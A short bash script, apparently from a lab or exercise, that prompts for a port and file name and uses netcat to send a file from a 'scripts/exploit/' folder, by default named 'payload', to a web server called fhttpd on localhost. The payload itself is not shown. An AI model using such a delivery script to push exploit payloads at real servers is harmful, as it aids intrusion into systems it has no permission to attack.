#!/bin/bash

# the following line uses netcat to transmit the contents
# of the file 'payload' to fhttpd running at the specified port

PORT_NUMBER=8080
FOLDER_NAME="scripts/exploit/"
FILE_NAME="payload"

# Ask to the user to introduce the port number to be used
echo "What port do you want to use for the web server? (Press Enter for 8080)."
read -r port_input

if [ -n "$port_input" ]; then
  PORT_NUMBER=$port_input
fi

# Ask to the user to introduce the port number to be used
echo "What file do you want to use? (Press Enter for payload)."
read -r file_input

if [ -n "$file_input" ]; then
  FILE_NAME=$file_input
fi

nc -q 2 localhost "$PORT_NUMBER" < "$FOLDER_NAME""$FILE_NAME"
